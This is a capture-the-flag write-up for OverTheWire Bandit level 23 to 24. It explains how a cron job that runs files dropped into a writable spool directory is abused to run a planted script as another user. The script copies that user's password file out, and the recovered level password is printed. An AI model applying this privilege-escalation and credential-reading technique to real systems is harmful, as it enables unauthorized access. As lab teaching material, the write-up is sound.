# Bandit Level 23 → 24 Writeup

## Goal

> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

## Solution

The challenge again mentioned `cron`, so I first went to `/etc/cron.d/` and checked the cron configuration for `bandit24`:

```bash
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls -la
total 56
drwxr-xr-x   2 root root  4096 Jul  3 16:19 .
drwxr-xr-x 124 root root 12288 Jun 25 12:37 ..
-rw-r--r--   1 root root   102 Nov  5  2025 .placeholder
-r--r-----   1 root root    47 Jun 24 14:59 behemoth4_cleanup
-rw-r--r--   1 root root   127 Jul  3 16:19 clean_tmp
-rw-r--r--   1 root root   120 Jun 24 14:58 cronjob_bandit22
-rw-r--r--   1 root root   122 Jun 24 14:58 cronjob_bandit23
-rw-r--r--   1 root root   120 Jun 24 14:59 cronjob_bandit24
-rw-r--r--   1 root root   188 Feb 13  2026 e2scrub_all
-r--r-----   1 root root    48 Jun 24 15:00 leviathan5_cleanup
-rw-------   1 root root   138 Jun 24 15:01 manpage3_resetpw_job
-rwx------   1 root root    52 Jun 24 15:02 otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

The cron file showed that `/usr/bin/cronjob_bandit24.sh` is executed every minute as `bandit24`, so I inspected that script next:

```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

I broke the script down from the top. Since the cronjob runs as `bandit24`, `whoami` becomes `bandit24`, so the script changes directory to `/var/spool/bandit24/foo`. Then it executes files in that folder only if they are regular files and their owner is `bandit23`.

I tried to look inside that folder, but I could not list its contents:

```bash
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls
ls: cannot open directory '.': Permission denied
```

After checking the permissions, the reason became clearer:

```bash
bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ ls -la /var/spool/bandit24/
total 56
dr-xr-x--- 3 bandit24 bandit23  4096 Jun 24 14:59 .
drwxr-xr-x 6 root     root      4096 Jun 24 15:02 ..
drwxrwx-wx 6 root     bandit24 45056 Aug 17 15:19 foo
```

For `foo`, other users have `-wx` permissions. That means I can enter the directory and write files into it, but I cannot list the files inside it because I do not have read permission.

I remembered from Level 13 -> 14 that Bandit passwords are stored in `/etc/bandit_pass/`, so I checked whether `bandit24`'s password was there too:

```bash
bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ ls -la /etc/bandit_pass/ | grep bandit24
-r--------   1 bandit24 bandit24    33 Jun 24 14:58 bandit24

bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ cat /etc/bandit_pass/bandit24
cat: /etc/bandit_pass/bandit24: Permission denied
```

So now, my exploit chain is:

- Write a script owned by `bandit23` to read `/etc/bandit_pass/bandit24`
- Make the script write the password back into a directory I control
- Copy the script into `/var/spool/bandit24/foo`
- Wait for the cronjob to execute my script as `bandit24`

First, I created a temporary working directory:

```bash
bandit23@bandit:/etc/cron.d$ mktemp -d
/tmp/tmp.SIKLi5xpVF
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.SIKLi5xpVF
```

One thing I had to be careful about here is that `mktemp -d` creates a private directory. If I leave it like that, the payload will run as `bandit24` but will not be able to write `password.txt` into this directory. Because of that, I changed the directory permission first:

```bash
bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ chmod 733 .
```

Then I wrote the payload script:

```bash
bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ vim shell.sh
bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ cat shell.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.SIKLi5xpVF/password.txt
```

After that, I made the script executable and copied it into the target spool directory:

```bash
bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ chmod +x shell.sh
bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ cp shell.sh /var/spool/bandit24/foo/shell.sh
```

I did not run `/usr/bin/cronjob_bandit24.sh` manually, because then it would run as `bandit23` instead of `bandit24`. I just waited for the cronjob to run automatically, then read the output file:

```bash
bandit23@bandit:/tmp/tmp.SIKLi5xpVF$ cat password.txt
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

If `password.txt` is not created yet, I only need to wait until the next minute and try reading it again.

## Password

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```
